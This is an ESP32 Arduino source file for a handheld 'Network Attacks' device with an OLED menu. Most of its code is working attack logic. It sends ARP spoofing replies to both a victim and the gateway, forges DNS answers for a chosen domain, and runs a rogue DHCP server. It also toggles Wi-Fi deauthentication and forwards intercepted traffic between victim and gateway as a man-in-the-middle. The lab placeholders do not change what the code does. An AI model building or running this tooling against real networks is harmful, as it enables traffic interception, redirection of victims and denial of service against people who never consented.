/*
 * ESP32 Network Attacks
 * 
 * PINOUT:
 *   OLED SDA -> GPIO 21
 *   OLED SCL -> GPIO 22
 *   BTN UP   -> GPIO 14 (other side to GND)
 *   BTN DOWN -> GPIO 27 (other side to GND)
 *   BTN SEL  -> GPIO 26 (other side to GND)
 *   LED      -> GPIO 2  (onboard LED, flashes on button press)
 */

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include "config.h"
#include "display_manager.h"
#include "input_manager.h"
#include "packet_utils.h"
#include "arp_utils.h"
#include "dns_utils.h"
#include "forwarding.h"
#include "dhcp_utils.h"
#include "deauth_utils.h"

#define LED_PIN 2

// ===== CONFIGURATION =====
const char* WIFI_SSID     = "YOUR_LAB_SSID";
const char* WIFI_PASS     = "YOUR_LAB_PASSWORD";
uint8_t VICTIM_MAC[6]     = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
IPAddress VICTIM_IP(192, 168, 1, 100);
uint8_t GATEWAY_MAC[6]    = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
IPAddress GATEWAY_IP(192, 168, 1, 1);
const char* TARGET_DOMAIN = "example.com";
IPAddress SPOOFED_IP(192, 168, 1, 200);
int ARP_INTERVAL_MS = 2000;

// ===== Globals =====
uint8_t g_esp32_mac[6];
IPAddress g_esp32_ip;
uint8_t g_bssid[6];
char TARGET_DOMAIN_STR[64];

static bool arpOn = false, dnsOn = false, dhcpOn = false, deauthOn = false;
static int arpCount = 0, dnsCount = 0, dhcpCount = 0;
int deauthCount = 0;  // Non-static so deauth_utils.cpp can increment it
static int cursor = 0;
static bool showStatus = false;
static unsigned long lastArp = 0, lastRender = 0, ledOffTime = 0;

#define MAX_PKT 512
#define QLEN 8
struct PktItem { uint16_t len; uint8_t data[MAX_PKT]; };
static PktItem pktQ[QLEN];
static volatile int qW = 0, qR = 0;

void IRAM_ATTR promCb(void* buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t* p = (wifi_promiscuous_pkt_t*)buf;
    uint16_t len = p->rx_ctrl.sig_len;
    if (len > MAX_PKT) len = MAX_PKT;
    int n = (qW + 1) % QLEN;
    if (n == qR) return;
    memcpy(pktQ[qW].data, p->payload, len);
    pktQ[qW].len = len;
    qW = n;
}

void processPkt(uint8_t* data, uint16_t len);
void renderMain();
void renderStatus();

void setup() {
    Serial.begin(115200);
    delay(500);
    
    pinMode(LED_PIN, OUTPUT);
    digitalWrite(LED_PIN, LOW);
    
    strlcpy(TARGET_DOMAIN_STR, TARGET_DOMAIN, 64);
    
    displayInit();
    inputInit();
    
    WiFi.mode(WIFI_STA);
    WiFi.setSleep(false);
    esp_wifi_set_ps(WIFI_PS_NONE);
    WiFi.begin(WIFI_SSID, WIFI_PASS);
    
    int attempts = 0;
    while (WiFi.status() != WL_CONNECTED && attempts < 20) { delay(500); attempts++; }
    
    WiFi.macAddress(g_esp32_mac);
    g_esp32_ip = WiFi.localIP();
    
    // FIX: WiFi.BSSID() returns NULL when not connected!
    uint8_t* bssid = WiFi.BSSID();
    if (bssid != NULL) {
        memcpy(g_bssid, bssid, 6);
    } else {
        memset(g_bssid, 0, 6);
        Serial.println("[!] WiFi not connected, BSSID unknown");
    }
    
    esp_wifi_set_promiscuous_rx_cb(&promCb);
    esp_wifi_set_promiscuous(true);
    
    Serial.println("[+] Network Attacks Ready");
}

void loop() {
    unsigned long now = millis();
    ButtonEvent evt = inputGetEvent();
    
    // LED feedback
    if (evt != EVT_NONE) {
        digitalWrite(LED_PIN, HIGH);
        ledOffTime = now + 200;
        Serial.print("[BTN] ");
        if (evt == EVT_UP) Serial.println("UP");
        if (evt == EVT_DOWN) Serial.println("DOWN");
        if (evt == EVT_SELECT) Serial.println("SELECT");
    }
    if (now > ledOffTime && digitalRead(LED_PIN) == HIGH) {
        digitalWrite(LED_PIN, LOW);
    }
    
    // Input handling
    if (!showStatus) {
        if (evt == EVT_UP && cursor > 0) cursor--;
        if (evt == EVT_DOWN && cursor < 4) cursor++;
        if (evt == EVT_SELECT) {
            if (cursor == 0) arpOn = !arpOn;
            if (cursor == 1) dnsOn = !dnsOn;
            if (cursor == 2) { dhcpOn = !dhcpOn; if (dhcpOn) dhcpStart(); else dhcpStop(); }
            if (cursor == 3) {
                // FIX: guard deauth if BSSID is invalid
                if (!deauthOn) {
                    bool bssidValid = false;
                    for (int i = 0; i < 6; i++) {
                        if (g_bssid[i] != 0) { bssidValid = true; break; }
                    }
                    if (!bssidValid) {
                        Serial.println("[!] Cannot start deauth: BSSID unknown (WiFi not connected)");
                    } else {
                        deauthOn = true;
                        deauthStart();
                    }
                } else {
                    deauthOn = false;
                    deauthStop();
                }
            }
            if (cursor == 4) showStatus = true;
        }
    } else {
        if (evt == EVT_SELECT || evt == EVT_UP || evt == EVT_DOWN) showStatus = false;
    }
    
    // ARP spoofing
    if (arpOn && now - lastArp >= (unsigned long)ARP_INTERVAL_MS) {
        lastArp = now;
        sendArpReply(VICTIM_MAC, GATEWAY_IP, g_esp32_mac, VICTIM_IP);
        sendArpReply(GATEWAY_MAC, VICTIM_IP, g_esp32_mac, GATEWAY_IP);
        arpCount++;
    }
    
    // Process packets
    while (qR != qW) {
        PktItem& it = pktQ[qR];
        if (dnsOn || dhcpOn) processPkt(it.data, it.len);
        qR = (qR + 1) % QLEN;
    }
    deauthUpdate();
    
    // Render
    if (now - lastRender > 50) {
        lastRender = now;
        if (!showStatus) renderMain();
        else renderStatus();
    }
    
    delay(5);
}

void processPkt(uint8_t* data, uint16_t len) {
    if (len < 32) return;
    uint16_t fc = data[0] | (data[1] << 8);
    bool fromDS = (fc >> 9) & 1;
    if ((fc & 0x0C) != 8 || !fromDS) return;
    
    uint8_t* a1 = &data[4];
    uint8_t* a3 = &data[16];
    if (memcmp(a1, g_esp32_mac, 6)) return;
    if (len < 32 + 8 + 20) return;
    
    uint8_t* llc = &data[24];
    if (llc[0]!=0xAA || llc[1]!=0xAA || llc[2]!=0x03) return;
    uint16_t et = llc[6] | (llc[7]<<8);
    if (et != 0x0800) return;
    
    uint8_t* ip = &data[32];
    uint8_t prot = ip[9];
    uint16_t ipLen = (ip[2]<<8)|ip[3];
    uint8_t ipHdr = (ip[0]&0x0F)*4;
    
    bool fromVic = !memcmp(a3, VICTIM_MAC, 6);
    bool fromGw = !memcmp(a3, GATEWAY_MAC, 6);
    
    if (fromVic) {
        if (prot == 17 && ipHdr + 8 <= ipLen) {
            uint8_t* udp = &ip[ipHdr];
            uint16_t dport = (udp[2]<<8)|udp[3];
            uint16_t ulen = (udp[4]<<8)|udp[5];
            if (dport == 53 && ulen >= 20 && dnsOn) {
                char dom[64];
                if (parseDnsQueryDomain(&udp[8], ulen-8, dom, sizeof(dom))) {
                    if (!strcmp(dom, TARGET_DOMAIN_STR)) {
                        sendDnsResponse(ip, udp, &udp[8], ulen-8, VICTIM_MAC, g_esp32_mac, g_bssid);
                        dnsCount++; return;
                    }
                }
            }
            if (dport == 67 && ulen >= 248 && dhcpOn) {
                dhcpProcessPacket(ip, udp, &udp[8], ulen-8);
                dhcpCount++; return;
            }
        }
        forwardToGateway(ip, ipLen);
    } else if (fromGw) {
        forwardToVictim(ip, ipLen);
    }
}

void renderMain() {
    displayClearBuffer();
    displayDrawStr(0, 8, "NETWORK ATTACKS");
    displayDrawLine(0, 10, 127, 10);
    const char* items[] = {"ARP Spoof", "DNS Spoof", "DHCP Spoof", "Deauth", "Status >"};
    const char* status[5];
    status[0] = arpOn ? "ON" : "OFF";
    status[1] = dnsOn ? "ON" : "OFF";
    status[2] = dhcpOn ? "ON" : "OFF";
    status[3] = deauthOn ? "ON" : "OFF";
    status[4] = "";
    
    for (int i = 0; i < 5; i++) {
        int y = 22 + i * 10;
        if (i == cursor) {
            displayDrawBox(0, y - 8, 128, 10);
            displaySetDrawColor(0);
        }
        displayDrawStr(4, y, items[i]);
        if (strlen(status[i]) > 0) {
            displayDrawStr(88, y, status[i]);
        }
        if (i == cursor) displaySetDrawColor(1);
    }
    displaySendBuffer();
}

void renderStatus() {
    displayClearBuffer();
    displayDrawStr(0, 8, "STATUS");
    displayDrawLine(0, 10, 127, 10);
    char buf[32];
    
    // FIX: avoid dangling pointer from temporary String object
    char ipStr[16];
    if (WiFi.status() == WL_CONNECTED) {
        strlcpy(ipStr, WiFi.localIP().toString().c_str(), sizeof(ipStr));
    } else {
        strlcpy(ipStr, "--", sizeof(ipStr));
    }
    displayDrawStr(0, 22, "IP:");
    displayDrawStr(24, 22, ipStr);
    
    sprintf(buf, "ARP:%d", arpCount); displayDrawStr(0, 34, buf);
    sprintf(buf, "DNS:%d", dnsCount); displayDrawStr(64, 34, buf);
    sprintf(buf, "DHCP:%d", dhcpCount); displayDrawStr(0, 46, buf);
    sprintf(buf, "DEA:%d", deauthCount); displayDrawStr(64, 46, buf);
    sprintf(buf, "RAM:%dKB", ESP.getFreeHeap()/1024); displayDrawStr(0, 58, buf);
    unsigned long sec = millis()/1000;
    sprintf(buf, "%02lu:%02lu", sec/60, sec%60); displayDrawStr(80, 58, buf);
    displaySendBuffer();
}
